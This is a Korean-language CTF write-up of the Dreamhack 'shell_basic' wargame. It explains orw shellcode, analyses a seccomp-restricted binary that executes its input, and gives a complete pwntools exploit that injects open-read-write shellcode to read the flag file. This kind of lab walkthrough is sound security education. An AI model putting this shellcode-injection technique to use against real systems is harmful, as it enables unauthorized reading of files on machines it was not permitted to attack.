https://dreamhack.io/wargame/challenges/410

### 🍞 개념

---

#### orw 셸코드

파일을 열고 읽은 뒤에 화면에 출력해주는 셸코드

`execve`를 실행할 수 없을 때 주로 사용

```c
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30)
write(1, buf, 0x30)
```

| syscall | rax | arg0 (rdi) | arg1 (rsi) | arg2(rdx) |
| --- | --- | --- | --- | --- |
| read | 0x00 | unsigned int fd | char *buf | size_t count |
| write | 0x01 | unsigned int fd | const char *buf | size_t count |
| open | 0x02 | const char *filename | int flags | umode_t mode |

### shellcraft

python pwntools에서 shellcraft라는 친절한 친구를 제공해준다.

```c
shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
```

직접 어셈블리어를 작성하지 않고도 쉽게 페이로드에 사용할 수 있다.

### 🔎 코드 분석

---

```c
void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}
```

`execve`가 실행이 안 되도록 막혀있는 것 같다. 함수 이름부터 `banned_execve`

```c
void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

주입된 셸코드를 바로 실행시키는 코드가 들어있다.

```c
sc = (void *)shellcode;
sc();
```

바로 입력 버퍼에 셸코드를 날리기만 하면 되는 문제!

flag 파일의 위치와 이름을 친절하게도 알려주었으니 서버에 접속해서 orw 셸코드를 날리기만 하면 자동으로 실행되고, 플래그를 읽을 수 있을 것이다.

### 🗡️ 익스플로잇

---

```python
from pwn import *

p = remote('host3.dreamhack.games', 10670)
context.arch = 'amd64'
```

기본 설정

```python
dir = '/home/shell_basic/flag_name_is_loooooong'

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
```

shellcraft 이용해서 셸코드 만들기

시스템 콜의 리턴은 항상 rax에 저장되기 때문에 fd는 rax에 존재

rsp를 임시 버퍼로 하여 읽어온 후 rsp의 내용을 표준 출력으로 출력

```python
p.sendlineafter(b"shellcode: ", asm(shellcode))
p.interactive()
```

셸코드를 어셈블리어로 만들어 바로 주입